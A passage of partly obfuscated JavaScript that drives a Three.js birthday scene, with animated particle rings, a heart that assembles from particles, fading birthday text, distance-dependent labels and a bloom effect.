    _0x2aca36(_0xb10520.radius, _0xb10520.height, 0, _0xb10520.edgeCount, "innerParticles" + (_0xa8f100 + 1));
  });
  const _0x3723bc = [8311551, 4089844, 16233151, 103832, 16777215],
    _0x5e4e81 = createRandomParticles(1500, 8, 2, 0.06, _0x3723bc);
  scene.add(_0x5e4e81);
  
  // 创建38个距离文字（text3-text40），根据相机距离淡入显示
  window._distanceTexts = [];
  
  const allTexts = [
    text3, text4, text5, text6, text7, text8, text9, text10,
    text11, text12, text13, text14, text15, text16, text17, text18,
    text19, text20, text21, text22, text23, text24, text25, text26,
    text27, text28, text29, text30, text31, text32, text33, text34,
    text35, text36, text37, text38, text39, text40
  ];
  
  allTexts.forEach((text, index) => {
    const i = index + 3;
    const radius = Math.max(30, 80 - i * 1.2);
    const angle = (i * 47) % 360;
    const yOffset = Math.max(0.5, 2.5 - i * 0.05);
    const size = Math.max(1.5, 3.0 - i * 0.03);
    
    const angleRad = angle * Math.PI / 180;
    const x = radius * Math.cos(angleRad);
    const z = radius * Math.sin(angleRad);
    
    const textMesh = _0x419865(text, size, 16751052);
    textMesh.position.set(x, yOffset, z);
    
    textMesh.rotation.x = -Math.PI / 2;
    textMesh.rotation.z = angleRad;
    
    textMesh.material.transparent = true;
    textMesh.material.opacity = 0;
    textMesh.userData = {
      distance: radius,
      minDistance: radius + 30,
      maxDistance: radius + 200,
      index: index
    };
    scene.add(textMesh);
    window._distanceTexts.push(textMesh);
  });
  
  // 创建螺旋彩带
  window._spiralRibbon = createSpiralRibbon(scene);
  
  window.addEventListener("resize", onWindowResize);
}
function createRingParticles(_0x49f109, _0x5719fa, _0x21a685, _0x4e25b8, _0xad13e6, _0x2e22ef, _0x570840, _0xa725ba, _0x397637) {
  const _0x6fd1f0 = new THREE.BufferGeometry(),
    _0x361482 = [],
    _0x2a562a = [],
    _0xd0c6 = [];
  for (let _0x199482 = 0; _0x199482 < _0x49f109; _0x199482++) {
    const _0x11d07e = _0x5719fa + (_0x21a685 - _0x5719fa) * (_0x199482 / (_0x49f109 - 1)),
      _0x88d4bd = _0x4e25b8 + (_0xad13e6 - _0x4e25b8) * Math.random(),
      _0x91e3fa = Math.floor(2 * Math.PI * _0x11d07e * 80);
    for (let _0x1275ff = 0; _0x1275ff < _0x91e3fa; _0x1275ff++) {
      const _0x20bbad = _0x1275ff / _0x91e3fa * Math.PI * 2;
      _0x361482.push(Math.cos(_0x20bbad) * _0x11d07e, _0x88d4bd, Math.sin(_0x20bbad) * _0x11d07e);
      const _0x47aa97 = new THREE.Color(_0xa725ba);
      _0x2a562a.push(_0x47aa97.r, _0x47aa97.g, _0x47aa97.b);
      _0xd0c6.push(_0x2e22ef + Math.random() * (_0x570840 - _0x2e22ef));
    }
  }
  _0x6fd1f0.setAttribute("position", new THREE.Float32BufferAttribute(_0x361482, 3));
  _0x6fd1f0.setAttribute("color", new THREE.Float32BufferAttribute(_0x2a562a, 3));
  _0x6fd1f0.setAttribute("size", new THREE.Float32BufferAttribute(_0xd0c6, 1));
  const _0x2e264d = new THREE.PointsMaterial({
    "size": 0.06,
    "vertexColors": true,
    "transparent": true,
    "opacity": _0x397637,
    "depthWrite": false,
    "blending": THREE.AdditiveBlending
  });
  return new THREE.Points(_0x6fd1f0, _0x2e264d);
}
function createRandomParticles(_0xdcdb6a, _0x2e1ddc, _0xb2ccf0, _0x27f551, _0xeeb9d) {
  const _0x52eb5b = new THREE.BufferGeometry(),
    _0x143848 = [],
    _0x3f0a12 = [];
  for (let _0x3660ef = 0; _0x3660ef < _0xdcdb6a; _0x3660ef++) {
    const _0x15b7a8 = (Math.random() - 0.5) * _0x2e1ddc * 2,
      _0x1feb59 = Math.random() * _0xb2ccf0 + 2.5,
      _0x3e6b11 = (Math.random() - 0.5) * _0x2e1ddc * 2;
    _0x143848.push(_0x15b7a8, _0x1feb59, _0x3e6b11);
    const _0x1b1708 = Math.random();
    let _0x129b68;
    if (_0x1b1708 < 0.4) _0x129b68 = 0;else {
      if (_0x1b1708 < 0.65) _0x129b68 = 1;else {
        if (_0x1b1708 < 0.85) _0x129b68 = 2;else {
          if (_0x1b1708 < 0.95) {
            _0x129b68 = 3;
          } else _0x129b68 = 4;
        }
      }
    }
    const _0x4b885b = new THREE.Color(_0xeeb9d[_0x129b68]);
    _0x3f0a12.push(_0x4b885b.r, _0x4b885b.g, _0x4b885b.b);
  }
  _0x52eb5b.setAttribute("position", new THREE.Float32BufferAttribute(_0x143848, 3));
  _0x52eb5b.setAttribute("color", new THREE.Float32BufferAttribute(_0x3f0a12, 3));
  const _0x482720 = new THREE.PointsMaterial({
      "size": _0x27f551 * 1.5,
      "vertexColors": true,
      "transparent": true,
      "opacity": 1,
      "depthWrite": false,
      "map": particleTexture,
      "blending": THREE.AdditiveBlending,
      "emissive": 657946,
      "emissiveIntensity": 0.5
    }),
    _0x17235b = new THREE.Points(_0x52eb5b, _0x482720);
  return _0x17235b.name = "starParticles", _0x17235b;
}
var version_ = 'jsjiami.com.v7';

function updateParticleDynamic(ZAqIQMkpn1) {
  if (
    !ZAqIQMkpn1["userData"] ||
    !ZAqIQMkpn1["userData"][
      "positions"
    ]
  )
    return;
  const now = window["Date"]["now"]();
  const userData = ZAqIQMkpn1["userData"];
  if (
    !userData[
      "animationStartTime"
    ]
  ) {
    userData[
      "animationStartTime"
    ] = now;
    userData["currentPhase"] = 0;
    userData["phaseDuration"] =
      3000 + window["Math"]["random"]() * 2000;
    userData["minRatio"] = 0.6;
    userData["maxRatio"] = 1.2;
  }
  const elapsed =
    now -
    userData[
      "animationStartTime"
    ];
  const phaseProgress =
    (elapsed %
      userData["phaseDuration"]) /
    userData["phaseDuration"];
  const sineWave = window["Math"]["sin"](
    phaseProgress * window["Math"]["PI"] * 2,
  );
  const normalizedValue = (sineWave + 1) / 2;
  const currentRatio =
    userData["minRatio"] +
    (userData["maxRatio"] -
      userData["minRatio"]) *
      normalizedValue;
  const originalCount =
    userData["originalCount"];
  const targetCount = window["Math"]["floor"](
    originalCount * currentRatio,
  );
  const newPositions = [];
  const newSizes = [];
  const newOpacities = [];
  for (let i = 0; i < targetCount; i++) {
    const index = i % originalCount;
    const originalX =
      userData["positions"][index * 3];
    const originalY =
      userData["positions"][index * 3 + 1];
    const originalZ =
      userData["positions"][index * 3 + 2];
    const timeOffset = elapsed * 0.001;
    const positionOffset = 0.08;
    const newX =
      originalX +
      window["Math"]["sin"](timeOffset + i * 0.1) *
        positionOffset *
        0.5;
    const newY =
      originalY +
      window["Math"]["cos"](timeOffset + i * 0.15) *
        positionOffset *
        0.3;
    const newZ =
      originalZ +
      window["Math"]["sin"](timeOffset + i * 0.12) *
        positionOffset *
        0.5;
    newPositions["push"](newX, newY, newZ);
    const sizeVariation =
      0.8 +
      window["Math"]["sin"](timeOffset + i * 0.2) * 0.2;
    newSizes["push"](
      userData["sizes"][index] * sizeVariation,
    );
    const opacityVariation =
      0.7 +
      window["Math"]["sin"](timeOffset + i * 0.25) * 0.3;
    newOpacities["push"](
      userData["opacities"][index] *
        opacityVariation,
    );
  }
  ZAqIQMkpn1["geometry"][
    "setAttribute"
  ](
    "position",
    new THREE[
      "Float32BufferAttribute"
    ](newPositions, 3),
  );
  ZAqIQMkpn1["geometry"][
    "setAttribute"
  ](
    "size",
    new THREE[
      "Float32BufferAttribute"
    ](newSizes, 1),
  );
  ZAqIQMkpn1["geometry"][
    "setAttribute"
  ](
    "opacity",
    new THREE[
      "Float32BufferAttribute"
    ](newOpacities, 1),
  );
  ZAqIQMkpn1["geometry"][
    "attributes"
  ]["position"][
    "needsUpdate"
  ] = true;
  ZAqIQMkpn1["geometry"][
    "attributes"
  ]["size"]["needsUpdate"] = true;
  ZAqIQMkpn1["geometry"][
    "attributes"
  ]["opacity"][
    "needsUpdate"
  ] = true;
}
function updateFlickerParticles(wr2) {
  if (
    !wr2["userData"] ||
    !wr2["userData"][
      "flickerIndices"
    ]
  )
    return;
  const opacities = wr2["geometry"][
    "getAttribute"
  ]("opacity");
  const time = performance["now"]() * 0.001;
  for (
    let i = 0;
    i <
    wr2["userData"][
      "flickerIndices"
    ]["length"];
    i++
  ) {
    const idx =
      wr2["userData"][
        "flickerIndices"
      ][i];
    const base =
      0.2 +
      0.8 *
        window["Math"]["abs"](
          window["Math"]["sin"](time * 3 + idx),
        );
    const noise =
      window["Math"]["random"]() * 0.2;
    opacities["setX"](
      idx,
      window["Math"]["min"](
        1,
        window["Math"]["max"](0.1, base + noise),
      ),
    );
  }
  opacities["needsUpdate"] = true;
}
function updateJumpParticles(WTI3, wAESOX4) {
  if (!WTI3["userData"]) return;
  const now = window["Date"]["now"]();
  if (
    !WTI3["userData"][
      "lastJumpTime"
    ]
  )
    WTI3["userData"][
      "lastJumpTime"
    ] = now;
  const interval = 100;
  if (
    now -
      WTI3["userData"][
        "lastJumpTime"
      ] <
    interval
  )
    return;
  WTI3["userData"][
    "lastJumpTime"
  ] = now;
  const positions = WTI3["geometry"][
    "getAttribute"
  ]("position");
  const opacities = WTI3["geometry"][
    "getAttribute"
  ]("opacity");
  const count =
    WTI3["userData"][
      "originalCount"
    ];
  const jumpCount = window["Math"]["floor"](
    count * wAESOX4,
  );
  const allIndices = window["Array"]["from"](
    {
      length: count,
    },
    (_, i) => i,
  );
  for (let i = allIndices["length"] - 1; i > 0; i--) {
    const j = window["Math"]["floor"](
      window["Math"]["random"]() * (i + 1),
    );
    [allIndices[i], allIndices[j]] = [allIndices[j], allIndices[i]];
  }
  const jumpIndices = allIndices["slice"](0, jumpCount);
  const normalIndices = allIndices["slice"](jumpCount);
  for (let i = 0; i < count; i++) {
    opacities["setX"](
      i,
      WTI3["userData"][
        "opacities"
      ][i],
    );
  }
  for (let k = 0; k < jumpIndices["length"]; k++) {
    const idx = jumpIndices[k];
    opacities["setX"](idx, 0.0);
    let r, theta, y;
    if (WTI3["userData"]["isRing"]) {
      r =
        WTI3["userData"]["radius"] +
        (window["Math"]["random"]() - 0.5) * 0.24;
      theta =
        window["Math"]["random"]() *
        window["Math"]["PI"] *
        2;
      y =
        WTI3["userData"][
          "yOffset"
        ] +
        WTI3["userData"]["height"] *
          window["Math"]["random"]();
    } else if (
      WTI3["name"]["startsWith"](
        "centerParticles",
      )
    ) {
      r =
        window["Math"]["random"]() *
        WTI3["userData"]["radius"] *
        (WTI3["name"] ===
        "centerParticles7"
          ? 0.5
          : 0.9);
      theta =
        window["Math"]["random"]() *
        window["Math"]["PI"] *
        2;
      y =
        WTI3["userData"][
          "yOffset"
        ] +
        WTI3["userData"]["height"] *
          window["Math"]["random"]();
    } else {
      r =
        WTI3["userData"]["radius"] *
        (0.5 + 0.6 * window["Math"]["random"]());
      theta =
        window["Math"]["random"]() *
        window["Math"]["PI"] *
        2;
      y =
        WTI3["userData"][
          "yOffset"
        ] +
        WTI3["userData"]["height"] *
          window["Math"]["random"]();
    }
    positions["setXYZ"](
      idx,
      window["Math"]["cos"](theta) * r,
      y,
      window["Math"]["sin"](theta) * r,
    );
  }
  positions["needsUpdate"] = true;
  opacities["needsUpdate"] = true;
}
function updateHeartParticlesFlicker(zJzsAWwGL5) {
  if (
    !zJzsAWwGL5 ||
    !zJzsAWwGL5["geometry"] ||
    !zJzsAWwGL5["userData"][
      "flickerIndices"
    ]
  )
    return;
  const colors = zJzsAWwGL5["geometry"][
    "getAttribute"
  ]("color");
  if (!colors || colors["count"] === 0) return;
  const time = performance["now"]() * 0.001;
  for (
    let i = 0;
    i <
    zJzsAWwGL5["userData"][
      "flickerIndices"
    ]["length"];
    i++
  ) {
    const idx =
      zJzsAWwGL5["userData"][
        "flickerIndices"
      ][i];
    if (idx >= colors["count"]) continue;
    const base =
      0.1 +
      0.9 *
        window["Math"]["abs"](
          window["Math"]["sin"](time * 3 + i * 0.5),
        );
    const noise =
      window["Math"]["random"]() * 0.15;
    const brightness = window["Math"]["min"](
      1.0,
      base + noise,
    );
    const baseIndex =
      zJzsAWwGL5["userData"][
        "selectedIndices"
      ][idx];
    if (
      baseIndex === undefined ||
      baseIndex * 3 + 2 >=
        zJzsAWwGL5["userData"][
          "allColors"
        ]["length"]
    )
      continue;
    const r =
      zJzsAWwGL5["userData"][
        "allColors"
      ][baseIndex * 3];
    const g =
      zJzsAWwGL5["userData"][
        "allColors"
      ][baseIndex * 3 + 1];
    const b =
      zJzsAWwGL5["userData"][
        "allColors"
      ][baseIndex * 3 + 2];
    const hueShift =
      window["Math"]["sin"](time * 2 + i * 0.3) * 0.3 +
      0.7;
    colors["setXYZ"](
      idx,
      r * brightness * 2.0,
      g * brightness * hueShift * 1.5,
      b * brightness * (2 - hueShift),
    );
  }
  colors["needsUpdate"] = true;
}
function onWindowResize() {
  camera["aspect"] =
    window["innerWidth"] /
    window["innerHeight"];
  camera[
    "updateProjectionMatrix"
  ]();
  renderer["setSize"](
    window["innerWidth"],
    window["innerHeight"],
  );
  composer["setSize"](
    window["innerWidth"],
    window["innerHeight"],
  );
}
function animate() {
  requestAnimationFrame(animate);
  controls["update"]();
  const targetPosition = new THREE["Vector3"](0, 2, 0);
  const distance =
    camera["position"][
      "distanceTo"
    ](targetPosition);
  const minDistance = 5;
  const maxDistance = 25;
  const minBloomStrength = 0.1;
  const maxBloomStrength = 2.0;
  // 动态调整辉光强度 - 开始
  let bloomStrength;
  if (distance <= minDistance) {
    bloomStrength = maxBloomStrength;
  } else if (distance >= maxDistance) {
    bloomStrength = minBloomStrength;
  } else {
    const t = (distance - minDistance) / (maxDistance - minDistance);
    bloomStrength =
      maxBloomStrength - (maxBloomStrength - minBloomStrength) * t;
  }
  if (bloomPass) {
    bloomPass["strength"] = bloomStrength;
  }
  // 动态调整辉光强度 - 结束
  for (let i = 1; i <= ringConfigs["length"]; i++) {
    const ring = scene[
      "getObjectByName"
    ](`baseLayer${i}`);
    if (ring) {
      ring["rotation"]["y"] += 0.001;
    }
    const center = scene[
      "getObjectByName"
    ](`centerParticles${i}`);
    if (center) {
      center["rotation"]["y"] += 0.001;
    }
    const inner = scene[
      "getObjectByName"
    ](`innerParticles${i}`);
    if (inner) {
      inner["rotation"]["y"] += 0.001;
    }
  }
  const starParticles = scene[
    "getObjectByName"
  ]("starParticles");
  if (starParticles)
    starParticles["rotation"]["y"] += 0.003;
  const spinRing = scene[
    "getObjectByName"
  ]("spinRing");
  if (spinRing) spinRing["rotation"]["y"] += 0.008;
  const heartParticles = scene[
    "getObjectByName"
  ]("heartParticles");
  if (heartParticles && heartParticles["userData"]) {
    const userData = heartParticles["userData"];
    const elapsed =
      (window["Date"]["now"]() -
        userData["startTime"]) /
      1000;
    const duration = 3;
    if (
      elapsed < duration &&
      userData["currentCount"] <
        userData["targetCount"]
    ) {
      const progress = elapsed / duration;
      const targetCount = window["Math"]["min"](
        userData["targetCount"],
        window["Math"]["round"](
          userData["targetCount"] * progress,
        ),
      );
      if (
        targetCount >
        userData["currentCount"]
      ) {
        const newPositions = [];
        const newColors = [];
        for (let i = 0; i < targetCount; i++) {
          const index =
            userData[
              "selectedIndices"
            ][i];
          newPositions["push"](
            userData["allPositions"][
              index * 3
            ],
            userData["allPositions"][
              index * 3 + 1
            ],
            userData["allPositions"][
              index * 3 + 2
            ],
          );
          newColors["push"](
            userData["allColors"][index * 3],
            userData["allColors"][index * 3 + 1],
            userData["allColors"][index * 3 + 2],
          );
        }
        heartParticles["geometry"][
          "setAttribute"
        ](
          "position",
          new THREE[
            "Float32BufferAttribute"
          ](newPositions, 3),
        );
        heartParticles["geometry"][
          "setAttribute"
        ](
          "color",
          new THREE[
            "Float32BufferAttribute"
          ](newColors, 3),
        );
        heartParticles["geometry"][
          "attributes"
        ]["position"][
          "needsUpdate"
        ] = true;
        heartParticles["geometry"][
          "attributes"
        ]["color"][
          "needsUpdate"
        ] = true;
        userData["currentCount"] =
          targetCount;
        const percent = window["Math"]["round"](
          (userData["currentCount"] /
            userData["targetCount"]) *
            100,
        );
      }
    } else if (
      userData["currentCount"] <
      userData["targetCount"]
    ) {
      const newPositions = [];
      const newColors = [];
      for (
        let i = 0;
        i < userData["targetCount"];
        i++
      ) {
        const index =
          userData[
            "selectedIndices"
          ][i];
        newPositions["push"](
          userData["allPositions"][
            index * 3
          ],
          userData["allPositions"][
            index * 3 + 1
          ],
          userData["allPositions"][
            index * 3 + 2
          ],
        );
        newColors["push"](
          userData["allColors"][index * 3],
          userData["allColors"][index * 3 + 1],
          userData["allColors"][index * 3 + 2],
        );
      }
      heartParticles["geometry"][
        "setAttribute"
      ](
        "position",
        new THREE[
          "Float32BufferAttribute"
        ](newPositions, 3),
      );
      heartParticles["geometry"][
        "setAttribute"
      ](
        "color",
        new THREE[
          "Float32BufferAttribute"
        ](newColors, 3),
      );
      heartParticles["geometry"][
        "attributes"
      ]["position"][
        "needsUpdate"
      ] = true;
      heartParticles["geometry"][
        "attributes"
      ]["color"][
        "needsUpdate"
      ] = true;
      userData["currentCount"] =
        userData["targetCount"];
    } else if (
      elapsed >= duration &&
      userData["currentCount"] >=
        userData["targetCount"]
    ) {
      if (
        !userData[
          "movementStarted"
        ]
      ) {
        userData[
          "movementStarted"
        ] = true;
        userData[
          "movementStartTime"
        ] = window["Date"]["now"]();
        userData["originalSceneX"] =
          scene["position"]["x"];
        if (
          !userData[
            "flickerInitialized"
          ]
        ) {
          userData[
            "flickerInitialized"
          ] = true;
          const totalDisplayed =
            heartParticles["geometry"][
              "attributes"
            ]["position"]["count"];
          const flickerCount = window["Math"][
            "floor"
          ](totalDisplayed * 0.5);
          const flickerIndices = [];
          const allIndices = window["Array"]["from"](
            {
              length: totalDisplayed,
            },
            (_, i) => i,
          );
          const positions =
            heartParticles["geometry"][
              "attributes"
            ]["position"]["array"];
          allIndices["sort"]((a, b) => {
            const aX = window["Math"]["abs"](
              positions[a * 3],
            );
            const aY = positions[a * 3 + 1];
            const bX = window["Math"]["abs"](
              positions[b * 3],
            );
            const bY = positions[b * 3 + 1];
            const aScore =
              -aX - window["Math"]["abs"](aY - 0.8);
            const bScore =
              -bX - window["Math"]["abs"](bY - 0.8);
            return bScore - aScore;
          });
          const priorityCount = window["Math"][
            "floor"
          ](totalDisplayed * 0.6);
          const priorityIndices = allIndices["slice"](
            0,
            priorityCount,
          );
          const priorityFlickerCount = window["Math"][
            "floor"
          ](flickerCount * 0.6);
          for (let i = 0; i < priorityFlickerCount; i++) {
            if (i < priorityIndices["length"]) {
              flickerIndices["push"](priorityIndices[i]);
            }
          }
          const remainingIndices =
            allIndices["slice"](priorityCount);
          for (
            let i = remainingIndices["length"] - 1;
            i > 0;
            i--
          ) {
            const j = window["Math"]["floor"](
              window["Math"]["random"]() *
                (i + 1),
            );
            [remainingIndices[i], remainingIndices[j]] = [
              remainingIndices[j],
              remainingIndices[i],
            ];
          }
          const remainingFlickerCount =
            flickerCount - flickerIndices["length"];
          for (let i = 0; i < remainingFlickerCount; i++) {
            if (i < remainingIndices["length"]) {
              flickerIndices["push"](remainingIndices[i]);
            }
          }
          heartParticles["userData"][
            "flickerIndices"
          ] = flickerIndices;
        }
      }
      const movementElapsed =
        (window["Date"]["now"]() -
          userData[
            "movementStartTime"
          ]) /
        1000;
      const movementDuration = 1.1;
      if (movementElapsed < movementDuration) {
        const progress = movementElapsed / movementDuration;
        const easeProgress = progress;
        const targetX =
          userData["originalSceneX"] -
          1;
        const currentX =
          userData["originalSceneX"] +
          (targetX -
            userData[
              "originalSceneX"
            ]) *
            easeProgress;
        scene["position"]["x"] = currentX;
      } else if (
        !userData[
          "movementCompleted"
        ]
      ) {
        userData[
          "movementCompleted"
        ] = true;
        scene["position"]["x"] =
          userData["originalSceneX"] -
          1;
        if (
          window[
            "_birthdayTextGroup"
          ]
        ) {
          window[
            "_birthdayTextGroup"
          ]["visible"] = true;
          const textGroup =
            window[
              "_birthdayTextGroup"
            ];
          textGroup["userData"][
            "fadeStartTime"
          ] = window["Date"]["now"]();
          textGroup["userData"][
            "fadeDuration"
          ] = 1500;
          textGroup["traverse"]((obj) => {
            if (
              obj["isMesh"] &&
              obj["material"]
            ) {
              obj["material"][
                "transparent"
              ] = true;
              obj["material"][
                "opacity"
              ] = 0;
            }
          });
          textGroup["children"][
            "forEach"
          ]((child) => {
            if (
              child["isMesh"] &&
              child["position"]["y"] > 0.5
            ) {
              child["material"][
                "transparent"
              ] = true;
              child["material"][
                "opacity"
              ] = 0;
            }
          });
        }
      }
    }
  }
  for (let i = 1; i <= ringConfigs["length"]; i++) {
    [
      "baseLayer",
      "centerParticles",
      "innerParticles",
    ]["forEach"]((type) => {
      const obj = scene[
        "getObjectByName"
      ](`${type}${i}`);
      if (obj) updateFlickerParticles(obj);
    });
  }
  for (let i = 1; i <= ringConfigs["length"]; i++) {
    [
      "baseLayer",
      "centerParticles",
      "innerParticles",
    ]["forEach"]((type) => {
      const obj = scene[
        "getObjectByName"
      ](`${type}${i}`);
      if (obj) updateJumpParticles(obj, 0.01);
    });
  }
  const heartParticlesObj = scene[
    "getObjectByName"
  ]("heartParticles");
  if (
    heartParticlesObj &&
    heartParticlesObj["userData"] &&
    heartParticlesObj["userData"][
      "flickerIndices"
    ]
  ) {
    updateHeartParticlesFlicker(heartParticlesObj);
  }
  if (window["_frameAnimators"]) {
    window["_frameAnimators"][
      "forEach"
    ]((fn) => fn());
  }
  if (
    window[
      "_birthdayTextGroup"
    ] &&
    window[
      "_birthdayTextGroup"
    ]["userData"][
      "fadeStartTime"
    ]
  ) {
    const textGroup =
      window[
        "_birthdayTextGroup"
      ];
    const elapsed =
      window["Date"]["now"]() -
      textGroup["userData"][
        "fadeStartTime"
      ];
    const duration =
      textGroup["userData"][
        "fadeDuration"
      ];
    if (elapsed <= duration) {
      const progress = elapsed / duration;
      const easeInOutCubic =
        progress < 0.5
          ? 4 * progress * progress * progress
          : 1 -
            window["Math"]["pow"](-2 * progress + 2, 3) /
              2;
      textGroup["traverse"]((obj) => {
        if (
          obj["isMesh"] &&
          obj["material"] &&
          obj["material"][
            "transparent"
          ]
        ) {
          obj["material"][
            "opacity"
          ] = easeInOutCubic;
        }
      });
    } else if (
      textGroup["userData"][
        "fadeCompleted"
      ] !== true
    ) {
      textGroup["traverse"]((obj) => {
        if (
          obj["isMesh"] &&
          obj["material"] &&
          obj["material"][
            "transparent"
          ]
        ) {
          obj["material"][
            "opacity"
          ] = 1;
        }
      });
      textGroup["userData"][
        "fadeCompleted"
      ] = true;
    }
  }
  
  // 根据相机距离更新文字透明度
  if (window._distanceTexts && window._distanceTexts.length > 0) {
    const cameraDistance = camera.position.distanceTo(new THREE.Vector3(0, 0, 0));
    
    window._distanceTexts.forEach((textMesh) => {
      const textDistance = textMesh.userData.distance;
      const minDist = textMesh.userData.minDistance;
      const maxDist = textMesh.userData.maxDistance;
      
      let opacity = 0;
      
      if (cameraDistance <= minDist) {
        opacity = 1;
      } else if (cameraDistance >= maxDist) {
        opacity = 0;
      } else {
        const progress = (maxDist - cameraDistance) / (maxDist - minDist);
        opacity = Math.max(0, Math.min(1, progress));
      }
      
      textMesh.material.opacity = opacity;
    });
  }
  
  // 更新螺旋彩带
  if (window._spiralRibbon) {
    updateSpiralRibbon(window._spiralRibbon, camera);
  }
  
  composer["render"]();
}

const startBirthdayScene = window.startBirthdayScene;
export { startBirthdayScene };
